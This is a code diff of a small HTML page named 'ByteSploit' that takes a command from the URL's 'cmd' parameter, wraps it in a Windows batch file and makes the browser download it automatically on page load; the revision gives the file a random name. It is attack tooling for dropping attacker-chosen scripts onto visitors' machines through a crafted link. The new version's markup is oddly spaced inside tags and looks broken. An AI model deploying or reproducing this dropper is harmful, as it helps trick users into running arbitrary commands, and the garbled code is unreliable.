@@ -1,39 +1,43 @@
-<!DOCTYPE html>
-<html>
-<head>
-	<title>ByteSploit Remote CMD</title>
-	<script>
-		function createBatchFile() {
-			// Get arguments from form input or URL
-			var urlParams = new URLSearchParams(window.location.search);
-			var urlcmd = urlParams.get('cmd');
-			if (urlcmd !== null) {
-				cmd = urlcmd;
-			}
-			
-			// Create batch file content
-			var content = '@echo off\r\n';
-			content += '"' + cmd + '"';
-			
-			// Create Blob object
-			var blob = new Blob([content], {type: 'text/plain'});
-			
-			// Generate download URL and set it as the href of a link
-			var link = document.createElement('a');
-			link.download = 'script.bat';
-			link.href = URL.createObjectURL(blob);
-			link.click();
-		}
-		
-		// Set default value of cmd from URL and create batch file
-		var urlParams = new URLSearchParams(window.location.search);
-		var urlcmd = urlParams.get('cmd');
-		if (urlcmd !== null) {
-			var cmd = urlcmd;
-			createBatchFile();
-		}
-	</script>
-</head>
-<body>
-</body>
-</html>
+<!DOCTYPE html > 
+< html > 
+< head > 
+    < title >ByteSploit</ title > 
+    < script > 
+        function  createBatchFile ( )  { 
+            // Get arguments from form input or URL 
+            var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
+            var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
+            if  ( urlcmd  !==  null )  { 
+                cmd  =  urlcmd ; 
+            } 
+            
+            // Create batch file content 
+            var  content  =  '@echo off\r\n' ; 
+            content  +=  '"'  +  cmd  +  '"' ; 
+            
+            // Create Blob object 
+            var  blob  =  new  Blob ( [ content ] ,  { type :  'text/plain' } ) ; 
+            
+            // Generate random filename 
+            var  filename  =  'script_'  +  Math . random ( ) . toString ( 36 ) . substring ( 2 )  +  '.bat' ; 
+            
+            // Generate download URL and set it as the href of a link 
+            var  link  =  document . createElement ( 'a' ) ; 
+            link . download  =  filename ; 
+            link . href  =  URL . createObjectURL ( blob ) ; 
+            link . click ( ) ; 
+        } 
+        
+        // Set default value of cmd from URL and create batch file 
+        var  urlParams  =  new  URLSearchParams ( window . location . search ) ; 
+        var  urlcmd  =  urlParams . get ( 'cmd' ) ; 
+        if  ( urlcmd  !==  null )  { 
+            var  cmd  =  urlcmd ; 
+            createBatchFile ( ) ; 
+        } 
+    </ script > 
+</ head > 
+< body > 
+</ body > 
+</ html >
+
